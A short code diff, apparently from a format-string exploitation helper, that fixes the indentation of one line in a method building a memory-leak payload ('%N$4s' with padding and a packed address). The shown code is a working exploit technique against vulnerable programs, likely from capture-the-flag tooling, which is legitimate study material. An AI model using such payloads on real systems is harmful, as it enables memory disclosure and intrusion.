@@ -49,7 +49,7 @@ class FmtPayload:
     def get_leak_payload(self, leak):
 	
         crash_header = self.crash[0:self.crash.index('%')]
-	    real_offest = int(len(crash_header)/4 + self.offest + 5)
+        real_offest = int(len(crash_header)/4 + self.offest + 5)
         payload = (crash_header+'[Result]:%'+str(real_offest)+'$4s').ljust(4*real_offest-24,'a') + p32(leak)
         return payload
 
